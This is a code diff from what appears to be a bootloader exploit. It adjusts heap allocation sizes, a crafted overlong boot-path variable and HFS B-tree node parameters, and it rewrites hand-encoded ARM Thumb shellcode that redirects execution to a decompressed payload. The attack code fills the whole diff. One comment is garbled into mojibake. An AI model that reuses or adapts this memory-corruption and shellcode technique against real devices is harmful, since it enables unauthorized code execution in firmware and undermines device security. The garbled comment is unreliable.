@@ -220,7 +220,7 @@ my_adjust_stack(void)
      
      */
 #if 1
-    CALL(malloc)(2048 - 128);
+    CALL(malloc)(1984 - 64);
 #elif 0
     void *ptr;
     ptr = CALL(malloc)(1984 - 64);
@@ -235,7 +235,7 @@ void
 my_adjust_environ(void)
 {
 #if 1
-    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/disk.dmg", 0);
+    CALL(create_envvar)("boot-path", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/disk.dmg", 0);
 #endif
 }
 
@@ -317,7 +317,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);  
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#define NODE_SIZE (0x1000) /* also 0x1000 is working */
+#define NODE_SIZE (0x1000) /* 0x1000ËÆºõ¸üºÃ */
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
@@ -343,7 +343,7 @@ if (1) {
             PUT_WORD_LE(buffer, 0x443E0 + 16 - 0x44270, INSNT_MOV_R_I(1, 0xFC));
             PUT_WORD_LE(buffer, 0x443E0 + 18 - 0x44270, INSNT_LDR_R_PC(2, 32));
             PUT_WORD_LE(buffer, 0x443E0 + 20 - 0x44270, INSNT_MOV_R_I(3, nettoyeur_sz));
-            PUT_WORD_LE(buffer, 0x443E0 + 22 - 0x44270, INSNT_PUSH_R0);
+            PUT_WORD_LE(buffer, 0x443E0 + 22 - 0x44270, INSNT_MOV_R_R(5,0));
             PUT_DWORD_LE(buffer, 0x443E0 + 24 - 0x44270, make_bl(0, 0x443E0 + 24, decompress_lzss_ADDR - 1));
             PUT_DWORD_LE(buffer, 0x443E0 + 28 - 0x44270, make_bl(0, 0x443E0 + 28, 0x44730 + 32));
             PUT_DWORD_LE(buffer, 0x443E0 + 36 - 0x44270, 0x3F378 /* go command handler */);
@@ -404,8 +404,9 @@ if (1) {
             PUT_DWORD_LE(buffer, 0x44730 +  28 - 0x44694, make_bl(0, 0x44730 + 28, 0x443E0));
             PUT_WORD_LE(buffer,  0x44730 +  32 - 0x44694, INSNT_LDR_R_PC(0, 56));
             PUT_WORD_LE(buffer,  0x44730 +  34 - 0x44694, INSNT_BLX_R(0));
-            PUT_WORD_LE(buffer,  0x44730 +  36 - 0x44694, INSNT_MOV_R_R(14, 4));
-            PUT_WORD_LE(buffer,  0x44730 +  38 - 0x44694, INSNT_POP_PC);
+            PUT_DWORD_LE(buffer, 0x44730 +  36 - 0x44694, make_bl(0, 0x44730 + 38, cache_stuff_ADDR - 1));
+            PUT_WORD_LE(buffer,  0x44730 +  40 - 0x44694, INSNT_BLX_R(5));
+	        PUT_WORD_LE(buffer,  0x44730 +  42 - 0x44694, INSNT_BX_R(4));
             PUT_DWORD_LE(buffer, 0x44730 +  76 - 0x44694, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
             PUT_DWORD_LE(buffer, 0x44730 +  80 - 0x44694, (uintptr_t)image /* 0x44000000 */);
             PUT_DWORD_LE(buffer, 0x44730 +  84 - 0x44694, (uintptr_t)image /* 0x5ff00000 */);
